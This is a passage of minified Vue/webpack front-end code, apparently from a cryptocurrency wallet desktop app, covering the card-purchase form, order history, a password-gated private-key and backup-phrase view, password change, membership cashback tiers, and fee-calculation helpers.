              i("div", { staticClass: "submit-wrapper" }, [
                i(
                  "div",
                  [
                    e.isCheckbox
                      ? i(
                          "AtomicCheckbox",
                          {
                            staticClass: "m-b-15",
                            model: {
                              value: e.checkboxValue,
                              callback: function (t) {
                                e.checkboxValue = t;
                              },
                              expression: "checkboxValue",
                            },
                          },
                          [
                            e._v("\n        I accept the\n        "),
                            i(
                              "a",
                              {
                                on: {
                                  click: function (t) {
                                    return e.$electron.openExternal(
                                      "https://atomicwallet.io/terms-of-service#third-party-integrations"
                                    );
                                  },
                                },
                              },
                              [e._v("\n          Terms of Service\n        ")]
                            ),
                          ]
                        )
                      : e._e(),
                  ],
                  1
                ),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button shadow",
                    class: {
                      accepted: !e.isCoinDisabled && e.isButtonAccepted,
                      disabled:
                        !e.checkboxValue || e.quoteError || e.isCoinDisabled,
                    },
                    on: {
                      click: function (t) {
                        return (
                          t.preventDefault(),
                          e.submitSimplexForm.apply(null, arguments)
                        );
                      },
                    },
                  },
                  [e._v("\n      Continue\n    ")]
                ),
              ]),
              e._v(" "),
              e._m(0),
              e._v(" "),
              e.isMember ? e._e() : i("CashbackPromotion"),
            ],
            1
          );
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              a = e._self._c || t;
            return a("div", { staticClass: "produced-wrapper" }, [
              a("div", { staticClass: "produced" }, [
                a("p", [e._v("Powered by:")]),
                e._v(" "),
                a("img", { staticClass: "simplex", attrs: { src: i(2306) } }),
              ]),
              e._v(" "),
              a("div", { staticClass: "produced fiat" }, [
                a("p", [e._v("Bank cards accepted")]),
                e._v(" "),
                a("div", { staticClass: "cards" }, [
                  a("img", { staticClass: "visa", attrs: { src: i(2307) } }),
                  e._v(" "),
                  a("img", { staticClass: "master", attrs: { src: i(2308) } }),
                ]),
              ]),
            ]);
          },
        ];
    },
    1364: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "exchange-history scroll-list2" },
            [
              e.isSimplexTransactionsLoading
                ? i("div", { staticClass: "loader" })
                : i(
                    "Table",
                    {
                      attrs: {
                        header: e.header,
                        isEmpty: 0 === e.simplexTransactions.length,
                        items: e.simplexTransactions,
                      },
                    },
                    [
                      e.simplexTransactions.length
                        ? e._e()
                        : i(
                            "div",
                            { attrs: { slot: "empty" }, slot: "empty" },
                            [
                              i("div", { staticClass: "empty" }, [
                                e._v("Your orders will appear here"),
                              ]),
                            ]
                          ),
                      e._v(" "),
                      i(
                        "div",
                        { attrs: { slot: "table-rows" }, slot: "table-rows" },
                        e._l(e.simplexTransactions, function (t, a) {
                          return i("ExchangeHistoryItem", {
                            key: a,
                            attrs: {
                              id: t.id,
                              isSimplex: "",
                              isOrderDetails: "",
                              date: e._f("moment")(
                                t.timestamp,
                                "DD/MM/YYYY HH:mm"
                              ),
                              getAmount: t.amountToReceive.toString(),
                              getTicker: t.toCurrency.toUpperCase(),
                              getWallet: e.$exchanges.getReceiverWalletByTx(
                                e.$wallets,
                                t
                              ),
                              sentAmount: t.amountToSend.toString(),
                              sentTicker: t.fromCurrency.toUpperCase(),
                              sentWallet: e.$exchanges.getSenderWalletByTx(
                                e.$wallets,
                                t
                              ),
                              status: e.checkStatus(t.status),
                            },
                            on: {
                              openRow: function (i) {
                                return e.$emit("openOrderDetails", t);
                              },
                            },
                          });
                        }),
                        1
                      ),
                    ]
                  ),
            ],
            1
          );
        },
        s = [];
    },
    1365: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "webview-wrapper" },
            [
              i("webview", {
                ref: "simplex_webview",
                class: { hidden: !e.showReady },
                attrs: {
                  id: "simplexWebview",
                  preload: e.preload,
                  src: e.sessionUrl,
                  httpreferrer:
                    "https://backend-wallet-api.simplexcc.com/payments/new",
                  name: "simplex_payment",
                  partition: "simplex",
                },
              }),
              e._v(" "),
              e.showReady ? e._e() : i("div", { staticClass: "loader" }),
            ],
            1
          );
        },
        s = [];
    },
    1368: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i("div", { staticClass: "tab-wrap private-keys" }, [
            e.innerKeyState
              ? e._e()
              : i(
                  "div",
                  { staticClass: "alert_wrap" },
                  [
                    i(
                      "Alert",
                      {
                        attrs: {
                          message:
                            "Never share your 12-word backup phrase and private keys with anyone. Never enter your info on any web wallets, online forms, or other websites claiming to be Atomic Wallet. Otherwise, you may risk losing your money.",
                          type: "Warning",
                        },
                      },
                      [
                        i(
                          "a",
                          {
                            staticClass:
                              "text-link-underline text-word-break text-big new-text-blue m-l-10",
                            attrs: { "data-test-id": "protect_link" },
                            on: {
                              click: function (t) {
                                return (
                                  t.stopPropagation(),
                                  e.open.apply(null, arguments)
                                );
                              },
                            },
                          },
                          [e._v("How do I protect my wallet?")]
                        ),
                      ]
                    ),
                  ],
                  1
                ),
            e._v(" "),
            e.innerKeyState
              ? i("div", { staticClass: "coins" }, [
                  i("div", { staticClass: "filter" }, [
                    i("input", {
                      directives: [
                        {
                          name: "model",
                          rawName: "v-model",
                          value: e.filter,
                          expression: "filter",
                        },
                      ],
                      staticClass: "placeholder-white",
                      attrs: { placeholder: "Search...", type: "text" },
                      domProps: { value: e.filter },
                      on: {
                        input: function (t) {
                          t.target.composing || (e.filter = t.target.value);
                        },
                      },
                    }),
                  ]),
                  e._v(" "),
                  e.keys.length > 0
                    ? i(
                        "div",
                        { staticClass: "list" },
                        [
                          !Object.keys(e.keysData).length && e.filter.length
                            ? i("div", { staticClass: "noresult" }, [
                                e._v(
                                  "\n        No results found for “" +
                                    e._s(e.filter) +
                                    "”\n      "
                                ),
                              ])
                            : e._e(),
                          e._v(" "),
                          i("div", { staticClass: "list-item" }, [
                            e._m(0),
                            e._v(" "),
                            i(
                              "div",
                              { staticClass: "info" },
                              [
                                i("CustomKey", {
                                  attrs: {
                                    isTrimValue: !1,
                                    value: e.mnemonic,
                                    title: "12-word backup phrase",
                                  },
                                }),
                              ],
                              1
                            ),
                          ]),
                          e._v(" "),
                          e._l(e.keysData, function (t, a) {
                            return i(
                              "div",
                              { key: a, staticClass: "list-item" },
                              [
                                i("div", { staticClass: "name" }, [
                                  i("div", { class: t.icon }),
                                  e._v(" "),
                                  i("span", [
                                    e._v(
                                      "\n            " +
                                        e._s(t.name) +
                                        "\n          "
                                    ),
                                  ]),
                                ]),
                                e._v(" "),
                                "EOS" === t.name
                                  ? i(
                                      "div",
                                      { staticClass: "info" },
                                      [
                                        i("CustomKey", {
                                          attrs: {
                                            isQrCode: !1,
                                            value: t.address,
                                            title: "Account name",
                                          },
                                        }),
                                        e._v(" "),
                                        t.additionalKeys
                                          ? i(
                                              "div",
                                              e._l(
                                                t.additionalKeys,
                                                function (t, a) {
                                                  return i(
                                                    "span",
                                                    {
                                                      key: a,
                                                      staticClass: "value",
                                                    },
                                                    [
                                                      e._v(
                                                        e._s(a) +
                                                          ":\n              "
                                                      ),
                                                      e._l(t, function (t, s) {
                                                        return i("CustomKey", {
                                                          key: s,
                                                          attrs: {
                                                            textClipboard:
                                                              e.eosTextClipboard(
                                                                a,
                                                                s
                                                              ),
                                                            title: s,
                                                            value: t,
                                                          },
                                                        });
                                                      }),
                                                    ],
                                                    2
                                                  );
                                                }
                                              ),
                                              0
                                            )
                                          : e._e(),
                                      ],
                                      1
                                    )
                                  : "Monero" === t.name
                                  ? i(
                                      "div",
                                      { staticClass: "info" },
                                      [
                                        i("CustomKey", {
                                          attrs: {
                                            value: t.address,
                                            title: "Address",
                                          },
                                        }),
                                        e._v(" "),
                                        t.additionalKeys
                                          ? i("CustomKey", {
                                              attrs: {
                                                value:
                                                  t.additionalKeys
                                                    .privateKeyView,
                                                title: "View Private Key",
                                              },
                                            })
                                          : e._e(),
                                        e._v(" "),
                                        t.additionalKeys
                                          ? i("CustomKey", {
                                              attrs: {
                                                value:
                                                  t.additionalKeys
                                                    .privateKeySpend,
                                                title: "Spend Private Key",
                                              },
                                            })
                                          : e._e(),
                                        e._v(" "),
                                        i("CustomKey", {
                                          attrs: {
                                            value:
                                              t.additionalKeys.publicKeySpend,
                                            title: "Spend Public Key",
                                          },
                                        }),
                                      ],
                                      1
                                    )
                                  : "Cardano" === t.name && t.additionalKeys
                                  ? i(
                                      "div",
                                      { staticClass: "info" },
                                      [
                                        i("CustomKey", {
                                          attrs: {
                                            value:
                                              t.additionalKeys.shelleyAddress ||
                                              "",
                                            title: "Address",
                                          },
                                        }),
                                        e._v(" "),
                                        i("CustomKey", {
                                          attrs: {
                                            value:
                                              t.additionalKeys
                                                .shelleyPrivateKey,
                                            title: "Private Key",
                                          },
                                        }),
                                        e._v(" "),
                                        i("CustomKey", {
                                          attrs: {
                                            value:
                                              t.additionalKeys.byronPrivateKey,
                                            title: "Legacy Private Key",
                                          },
                                        }),
                                        e._v(" "),
                                        i("CustomKey", {
                                          attrs: {
                                            value:
                                              t.additionalKeys.byronAddress,
                                            title: "Legacy Address",
                                          },
                                        }),
                                      ],
                                      1
                                    )
                                  : i(
                                      "div",
                                      { staticClass: "info" },
                                      [
                                        i("CustomKey", {
                                          attrs: {
                                            value: t.address,
                                            title: "Public Key",
                                          },
                                        }),
                                        e._v(" "),
                                        i("CustomKey", {
                                          attrs: {
                                            value: t.privateKey,
                                            title: "Private Key",
                                          },
                                        }),
                                      ],
                                      1
                                    ),
                              ]
                            );
                          }),
                        ],
                        2
                      )
                    : e._e(),
                ])
              : i(
                  "div",
                  { staticClass: "enter-form" },
                  [
                    i("Edit", {
                      attrs: {
                        error: e.privateKeyError,
                        focus: !0,
                        isShowPassword: !0,
                        placeholder: "Password",
                        type: "password",
                      },
                      on: { "enter-pressed": e.loadKeysData },
                      model: {
                        value: e.passwordForKey,
                        callback: function (t) {
                          e.passwordForKey = t;
                        },
                        expression: "passwordForKey",
                      },
                    }),
                    e._v(" "),
                    i(
                      "button",
                      {
                        staticClass: "button",
                        attrs: { "data-test-id": "show_private_keys" },
                        on: {
                          click: function (t) {
                            return (
                              t.preventDefault(),
                              t.stopPropagation(),
                              e.loadKeysData.apply(null, arguments)
                            );
                          },
                        },
                      },
                      [e._v("\n      Show private keys\n    ")]
                    ),
                  ],
                  1
                ),
          ]);
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i("div", { staticClass: "name" }, [
              i("div", { staticClass: "icon-awc" }),
              e._v(" "),
              i("span", [e._v(" Atomic ")]),
            ]);
          },
        ];
    },
    1369: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i("div", { staticClass: "tab-wrap security" }, [
            i("div", { staticClass: "text" }, [
              e._v(
                "\n    Before changing your password, click Private Keys in the top panel and write down your 12-word\n    backup phrase. This will help you restore your wallet if you forget your new password.\n  "
              ),
            ]),
            e._v(" "),
            i(
              "div",
              { staticClass: "inputs" },
              [
                i("Edit", {
                  ref: "oldPasswordRef",
                  attrs: {
                    error: e.oldPasswordError,
                    focus: !0,
                    isShowPassword: !0,
                    placeholder: "Old Password",
                    type: "password",
                    "data-test-id": "old_password",
                  },
                  on: {
                    changeTypeRepeatPassword: e.changeTypeRepeatPassword,
                    "enter-pressed": function (t) {
                      return e.changeOldPassword();
                    },
                  },
                  model: {
                    value: e.oldPassword,
                    callback: function (t) {
                      e.oldPassword = t;
                    },
                    expression: "oldPassword",
                  },
                }),
                e._v(" "),
                i(
                  "Edit",
                  {
                    ref: "newPasswordRef",
                    attrs: {
                      error: e.newPasswordError,
                      type: e.repeatPasswordType,
                      placeholder: "New Password",
                      "data-test-id": "new_password",
                    },
                    on: {
                      "enter-pressed": function (t) {
                        return e.changeOldPassword();
                      },
                    },
                    model: {
                      value: e.newPassword,
                      callback: function (t) {
                        e.newPassword = t;
                      },
                      expression: "newPassword",
                    },
                  },
                  [
                    i("PasswordStrength", {
                      attrs: { password: e.newPassword },
                    }),
                  ],
                  1
                ),
                e._v(" "),
                i("Edit", {
                  ref: "repeatNewPasswordRef",
                  attrs: {
                    error: e.repeatNewPasswordError,
                    type: e.repeatPasswordType,
                    placeholder: "Repeat New Password",
                    "data-test-id": "repeat_new_password",
                  },
                  on: {
                    "enter-pressed": function (t) {
                      return e.changeOldPassword();
                    },
                  },
                  model: {
                    value: e.repeatNewPassword,
                    callback: function (t) {
                      e.repeatNewPassword = t;
                    },
                    expression: "repeatNewPassword",
                  },
                }),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button",
                    attrs: { "data-test-id": "change_password_button" },
                    on: {
                      click: function (t) {
                        return (
                          t.preventDefault(),
                          t.stopPropagation(),
                          e.changeOldPassword.apply(null, arguments)
                        );
                      },
                    },
                  },
                  [e._v("\n      Change password\n    ")]
                ),
                e._v(" "),
                i("transition", { attrs: { mode: "out-in", name: "fade" } }, [
                  e.passwordWasSuccessfullyChanged
                    ? i("div", { staticClass: "message" }, [
                        e._v(
                          "\n        Your password has been changed\n      "
                        ),
                      ])
                    : e._e(),
                ]),
              ],
              1
            ),
          ]);
        },
        s = [];
    },
    1370: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            a = e._self._c || t;
          return a("main", { staticClass: "membership" }, [
            a("div", { staticClass: "header-wrap" }, [
              a("div", { staticClass: "status" }, [
                a("img", {
                  staticClass: "svg-icon svg-fill",
                  attrs: {
                    src: i(5552)(
                      "./membership-" +
                        (void 0 === e.settings ? "" : e.settings.class) +
                        ".svg"
                    ),
                  },
                }),
                e._v(" "),
                a(
                  "span",
                  { attrs: { "data-test-id": "settings-membership-status" } },
                  [
                    e._v(
                      e._s(
                        void 0 === e.settings || "basic" === e.settings.class
                          ? "Not a member"
                          : e.settings.text + " Status"
                      )
                    ),
                  ]
                ),
              ]),
              e._v(" "),
              a("div", { staticClass: "balance" }, [
                a("img", {
                  staticClass: "svg-icon svg-fill",
                  attrs: { src: i(2152) },
                }),
                e._v("\n      You have \n      "),
                a(
                  "span",
                  {
                    staticClass: "text-white",
                    attrs: { "data-test-id": "settings_awc_balance" },
                  },
                  [e._v(e._s(e._f("formatFinance")(e.amount)))]
                ),
                e._v(" AWC\n    "),
              ]),
            ]),
            e._v(" "),
            a("div", { staticClass: "body" }, [
              a("div", { staticClass: "text-info" }, [
                e._v(
                  "\n      Hold AWC-BNB token and receive AWC Cashback for each completed exchange."
                ),
                a("br"),
                e._v("\n      Rewards are distributed monthly. "),
                a(
                  "a",
                  {
                    staticClass: "readmore",
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://atomicwallet.io/membership"
                        );
                      },
                    },
                  },
                  [e._v("Read more")]
                ),
              ]),
              e._v(" "),
              a(
                "div",
                { staticClass: "settings" },
                e._l(e.$cashback.settings, function (t, s) {
                  return a(
                    "div",
                    {
                      key: s,
                      staticClass: "item",
                      class: [
                        t.class,
                        {
                          selected:
                            "silver" === t.class && !e.isNeededAmount(t.minAWC),
                        },
                      ],
                    },
                    [
                      "silver" === t.class && e.isNeededAmount(t.minAWC)
                        ? a("div", { staticClass: "choice" }, [
                            e._v("\n          Users’"),
                            a("br"),
                            e._v("Choice\n        "),
                          ])
                        : e._e(),
                      e._v(" "),
                      a("div", { staticClass: "status" }, [
                        e._v("\n          " + e._s(t.text) + "\n        "),
                      ]),
                      e._v(" "),
                      a("div", { staticClass: "atomic", class: t.class }, [
                        a("div", { staticClass: "background" }),
                        e._v(" "),
                        a("div", { staticClass: "icon-awc" }),
                      ]),
                      e._v(" "),
                      "basic" === t.class
                        ? a("div", { staticClass: "percent" }, [
                            e._v("\n          5 AWC\n        "),
                          ])
                        : a("div", { staticClass: "percent" }, [
                            e._v(
                              "\n          " +
                                e._s(100 * t.percent) +
                                "%\n        "
                            ),
                          ]),
                      e._v(" "),
                      a("div", { staticClass: "title" }, [e._v("Cashback")]),
                      e._v(" "),
                      "basic" === t.class
                        ? a("div", { staticClass: "limit" }, [
                            e._v("\n          One time bonus\n        "),
                          ])
                        : a("div", { staticClass: "limit" }, [
                            e._v(
                              "\n          max " +
                                e._s(t.limit) +
                                " USD/mth\n        "
                            ),
                          ]),
                      e._v(" "),
                      e.isNeededAmount(t.minAWC)
                        ? a(
                            "button",
                            {
                              staticClass: "button",
                              attrs: { "data-test-id": "buy-membership" },
                              on: { click: e.openCashbackExchange },
                            },
                            [
                              a("span", [
                                e._v(
                                  "BUY " +
                                    e._s(
                                      e._f("formatFinance")(
                                        e.neededAmount(t.minAWC)
                                      )
                                    ) +
                                    " AWC"
                                ),
                              ]),
                            ]
                          )
                        : "basic" !== t.class || e.hasTransaction
                        ? a("div", { staticClass: "step-completed" }, [
                            a("div", { staticClass: "background" }),
                            e._v(" "),
                            a("img", {
                              staticClass: "svg-success",
                              attrs: { src: i(1145) },
                            }),
                          ])
                        : a(
                            "button",
                            { staticClass: "button no-transactions" },
                            [e._m(0, !0)]
                          ),
                    ]
                  );
                }),
                0
              ),
            ]),
          ]);
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              a = e._self._c || t;
            return a("span", [
              a("img", { staticClass: "svg-success", attrs: { src: i(1145) } }),
            ]);
          },
        ];
    },
    15: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        Object.defineProperty(t, "ActivateCoinMixin", {
          enumerable: !0,
          get: function () {
            return x.default;
          },
        }),
        Object.defineProperty(t, "BuyMixin", {
          enumerable: !0,
          get: function () {
            return n.default;
          },
        }),
        Object.defineProperty(t, "CashbackMixin", {
          enumerable: !0,
          get: function () {
            return p.default;
          },
        }),
        Object.defineProperty(t, "CurrencyConverter", {
          enumerable: !0,
          get: function () {
            return b.default;
          },
        }),
        Object.defineProperty(t, "DBMixin", {
          enumerable: !0,
          get: function () {
            return o.default;
          },
        }),
        Object.defineProperty(t, "DisabledCoinMixin", {
          enumerable: !0,
          get: function () {
            return r.default;
          },
        }),
        Object.defineProperty(t, "ExchangeMixin", {
          enumerable: !0,
          get: function () {
            return f.default;
          },
        }),
        Object.defineProperty(t, "FeeMixin", {
          enumerable: !0,
          get: function () {
            return c.default;
          },
        }),
        Object.defineProperty(t, "HistoryMixin", {
          enumerable: !0,
          get: function () {
            return d.default;
          },
        }),
        Object.defineProperty(t, "NFTMixin", {
          enumerable: !0,
          get: function () {
            return T.default;
          },
        }),
        Object.defineProperty(t, "ScrollMixin", {
          enumerable: !0,
          get: function () {
            return l.default;
          },
        }),
        Object.defineProperty(t, "SendStakeMixin", {
          enumerable: !0,
          get: function () {
            return g.default;
          },
        }),
        Object.defineProperty(t, "SettingsMixin", {
          enumerable: !0,
          get: function () {
            return v.default;
          },
        }),
        Object.defineProperty(t, "StakingMixin", {
          enumerable: !0,
          get: function () {
            return u.default;
          },
        }),
        Object.defineProperty(t, "TransactionMixin", {
          enumerable: !0,
          get: function () {
            return h.default;
          },
        }),
        Object.defineProperty(t, "UtilsMixin", {
          enumerable: !0,
          get: function () {
            return s.default;
          },
        }),
        Object.defineProperty(t, "WalletsStateMixin", {
          enumerable: !0,
          get: function () {
            return w.default;
          },
        }),
        Object.defineProperty(t, "WalletsTables", {
          enumerable: !0,
          get: function () {
            return m.default;
          },
        });
      var s = a(i(4898)),
        n = a(i(4899)),
        o = a(i(4900)),
        r = a(i(4901)),
        c = a(i(4902)),
        l = a(i(4903)),
        d = a(i(4904)),
        u = a(i(4905)),
        h = a(i(4906)),
        p = a(i(4907)),
        m = a(i(4908)),
        f = a(i(4909)),
        v = a(i(4910)),
        g = a(i(4911)),
        b = a(i(4912)),
        w = a(i(4913)),
        x = a(i(4914)),
        T = a(i(4915));
    },
    2295: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(821),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1347),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    4898: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(30);
      const s = 1e3;
      var n = {
        data() {
          return {
            isCopiedToClipboard: !1,
            isCopiedToClipboardTimeout: null,
            timerDebounce: {},
          };
        },
        computed: {
          appConfig() {
            return {
              version: a.PlatformVersion.getVersion(),
              platform: a.PlatformVersion.getPlatform(),
            };
          },
        },
        filters: {
          $formatTextTrimMiddle(e, t) {
            void 0 === t && (t = 12);
            const i = 7;
            return e.length > t && t > i
              ? `${e.slice(0, t)}...${e.slice(-t)}`
              : e;
          },
          $formatTextTrim(e, t) {
            const i = "" + (null !== e && void 0 !== e ? e : "");
            return i.length > t ? i.slice(0, t) + "..." : i;
          },
        },
        methods: {
          $getAddressWallet(e) {
            var t;
            return null === (t = this.$wallets.getWallet(e)) || void 0 === t
              ? void 0
              : t.address;
          },
          $debounce(e, t) {
            void 0 === t && (t = 500),
              this.timerDebounce[e] &&
                (clearTimeout(this.timerDebounce[e]),
                delete this.timerDebounce[e]),
              (this.timerDebounce[e] = setTimeout(() => {
                e(), delete this.timerDebounce[e];
              }, t));
          },
          getFeeTicker(e) {
            const { ticker: t, deprecatedParent: i } = e;
            return ["VET", "VTHO"].includes(t)
              ? "VTHO"
              : ["NEO", "GAS"].includes(t)
              ? "GAS"
              : ["ONT", "ONG"].includes(t) &&
                "BSC" !== this.coin.deprecatedParent
              ? "ONG"
              : e.getFeeTicker
              ? e.getFeeTicker()
              : i;
          },
          filterSimilarsByKey(e, t) {
            return (
              void 0 === t && (t = "id"),
              e.reduce((e, i) => {
                const a = e.find((e) => e[t] === i[t]);
                return a ? e : [...e, i];
              }, [])
            );
          },
          $copyToClipboard(e) {
            this.isCopiedToClipboardTimeout &&
              clearTimeout(this.isCopiedToClipboardTimeout),
              this.$electron.clipboard.writeText(e),
              (this.isCopiedToClipboard = e),
              (this.isCopiedToClipboardTimeout = setTimeout(() => {
                this.isCopiedToClipboard = !1;
              }, s));
          },
          async $pasteFromClipboard() {
            var e;
            return String(
              null !== (e = await this.$electron.clipboard.readText()) &&
                void 0 !== e
                ? e
                : ""
            ).trim();
          },
          $iconClass(e) {
            var t;
            let i = null;
            const s =
              null === (t = String(e.ticker || e)) || void 0 === t
                ? void 0
                : t.toUpperCase();
            try {
              i = this.$wallets.getWallet(e.id);
            } catch (c) {
              console.log(c);
            }
            if (!i) return `icon-default icon-${s} icon-${s}`;
            const n = i.contract || i.id,
              o = String("icon-" + n).toLowerCase(),
              r =
                "icon-" +
                (null === n || void 0 === n ? void 0 : n.toUpperCase());
            if (i instanceof a.Token)
              switch (i.deprecatedParent) {
                case "OP":
                  return "icon-opTokenDefault " + o;
                case "ARB":
                  return "icon-arbTokenDefault " + o;
                case "ETH":
                  return "icon-ethTokenDefault " + o;
                case "BNB":
                  return "icon-bnbTokenDefault " + o;
                case "MATIC":
                  return `icon-maticTokenDefault icon-${i.ticker} ${o}`;
                case "FLR":
                  return `icon-flrTokenDefault icon-${i.ticker} ${o}`;
                case "FTM":
                  return "icon-ftmTokenDefault " + o;
                case "AVAX":
                  return `icon-AVAX icon-${i.ticker} ${o}`;
                case "LUNC":
                  return `icon-LUNC icon-${i.ticker} ${o}`;
                case "BSC":
                  return "icon-bscTokenDefault " + o;
                default:
                  break;
              }
            return `icon-default ${r} ${o}`;
          },
        },
      };
      t.default = n;
    },
    4899: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = {
        methods: {
          buy(e) {
            this.$buy.isAvailable(e)
              ? this.$router.push(
                  "/simplex/USD/" + this.$buy.getAvailableWallet(e).id
                )
              : this.$router.push({
                  path: "/exchange",
                  query: { coinToSend: "BTC", coinToReceive: e.id },
                });
          },
        },
      };
      t.default = a;
    },
    4900: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(27),
        s = {
          methods: {
            async clearAllTables() {
              const e = a.db.tables
                .map((e) => "rates" !== e.name && e.clear())
                .filter(Boolean);
              return Promise.all(e);
            },
          },
        };
      t.default = s;
    },
    4901: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(30),
        s = {
          computed: {
            actionBuy() {
              return a.ACTION_BUY;
            },
            actionClaim() {
              return a.ACTION_CLAIM;
            },
            actionExchange() {
              return a.ACTION_EXCHANGE;
            },
            actionSend() {
              return a.ACTION_SEND;
            },
            actionStake() {
              return a.ACTION_STAKE;
            },
            actionUnstake() {
              return a.ACTION_UNSTAKE;
            },
            actionVote() {
              return a.ACTION_VOTE;
            },
            actionWithdraw() {
              return a.ACTION_WITHDRAW;
            },
            stakingAllOperation() {
              return [
                this.actionClaim,
                this.actionStake,
                this.actionUnstake,
                this.actionVote,
                this.actionWithdraw,
              ];
            },
            stakingAllNoWithdrawOperation() {
              return [
                this.actionClaim,
                this.actionStake,
                this.actionUnstake,
                this.actionVote,
              ];
            },
          },
          methods: {
            getCoinDisabilityReason(e) {
              return a.CoinRestrictionPolicy.getMessage(this.coin.ticker, e);
            },
            isCoinDisabled(e) {
              return e.some(
                (e) => !a.CoinRestrictionPolicy.isAllowed(this.coin.ticker, e)
              );
            },
          },
        };
      t.default = s;
    },
    4902: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(30);
      const s = 1e9,
        n = "21000",
        o = 20,
        r = [
          "ETH",
          "LUNA",
          "LUNС",
          "BSC",
          "AVAX",
          "MATIC",
          "FLR",
          "FTM",
          "FIL",
          "OP",
        ];
      var c = {
        data() {
          return {
            satPerByte: null,
            utxos: [],
            defaultGasPrice: null,
            defaultGasLimit: null,
            minGasLimit: n,
            customGas: [],
            fee: { ticker: "", fee: "" },
          };
        },
        created() {
          this.setCustomSatoshi(this.defaultSatPerByte);
        },
        computed: {
          defaultSatPerByte() {
            try {
              const e = this.parent.getFeePerByte();
              return e && String(e);
            } catch {
              return "1";
            }
          },
          feeTicker() {
            return this.getFeeTicker(this.coin);
          },
          fees() {
            var e, t;
            return null !==
              (e = null === (t = this.fee) || void 0 === t ? void 0 : t.fee) &&
              void 0 !== e
              ? e
              : "0";
          },
        },
        methods: {
          async getUtxos() {
            try {
              const e = await this.parent.getUnspentOutputs();
              return e;
            } catch {
              return [];
            }
          },
          setFee(e) {
            this.fee.fee = e;
          },
          setCustomSatoshi(e) {
            this.satPerByte = e;
          },
          setCustomGas(e) {
            this.customGas = e;
          },
          async getFee(e, t) {
            void 0 === e && (e = 1),
              void 0 === t && (t = null),
              this.setFee(null),
              this.$debounce(async () => {
                var i, n, c;
                const l = new Set([
                  "BSC",
                  "ETH",
                  "LUNC",
                  "LUNA",
                  "THETA",
                  "FLR",
                ]);
                [this.coin.ticker, this.coin.deprecatedParent].some((e) =>
                  l.has(e)
                ) || (this.utxos = await this.getUtxos());
                const d = this.coin instanceof a.Token;
                let u = null;
                const h = new Set(r);
                if (
                  this.isCustomFeeSupported &&
                  h.has(this.coin.deprecatedParent)
                ) {
                  var p, m;
                  const e = await this.parent.getGasPrice(!1, !0);
                  u =
                    ("ETH" === this.coin.deprecatedParent &&
                      ((null === (p = this.coin) ||
                      void 0 === p ||
                      null === (m = p.gasPriceConfig) ||
                      void 0 === m
                        ? void 0
                        : m.fast) *
                        s) /
                        10) ||
                    e;
                  const t = await this.parent.getGasPrice(!0, d);
                  (this.nodeGasPrice = (Number(t) / s)
                    .toString()
                    .replace(/\.[0-9]+[1-9]/, "")),
                    (this.defaultGasPrice = (Number(u) / s)
                      .toString()
                      .replace(/\.[0-9]+[1-9]/, "")),
                    d || ["LUNC", "LUNA"].includes(this.coin.ticker)
                      ? ((this.minGasLimit = String(
                          ["LUNC", "LUNA"].includes(this.coin.deprecatedParent)
                            ? await this.parent.estimateGas(
                                "1",
                                "",
                                this.coin.contract,
                                this.coin.denom
                              )
                            : await this.parent.estimateGas(
                                "1",
                                "",
                                this.coin.contract
                              )
                        )),
                        (this.defaultGasLimit = this.minGasLimit))
                      : (this.defaultGasLimit = String(this.coin.gasLimit));
                }
                const f =
                    (Number(e) && e) ||
                    (Number(this.inputs.amount) > 0 && this.inputs.amount),
                  v = this.coin.toMinimalUnit(f || "0");
                let g = null;
                if ("ADA" === this.coin.ticker)
                  g = { utxos: this.utxos, address: t, sendAmount: v };
                else if (
                  "TRX" === this.parent.ticker &&
                  "TRX" !== this.coin.ticker
                )
                  g = {
                    address: this.inputs.address,
                    amount: v,
                    contract: this.coin.contract,
                  };
                else if (
                  "ZIL" !== this.coin.deprecatedParent &&
                  "VTHO" !== this.coin.ticker
                ) {
                  var b, w;
                  g = {
                    feePerByte:
                      this.satoshiPerByte ||
                      this.satPerByte ||
                      this.defaultSatPerByte,
                    userGasPrice:
                      (null === (b = this.customGas) || void 0 === b
                        ? void 0
                        : b[0]) || u,
                    utxos: this.utxos,
                    gasLimit:
                      (null === (w = this.customGas) || void 0 === w
                        ? void 0
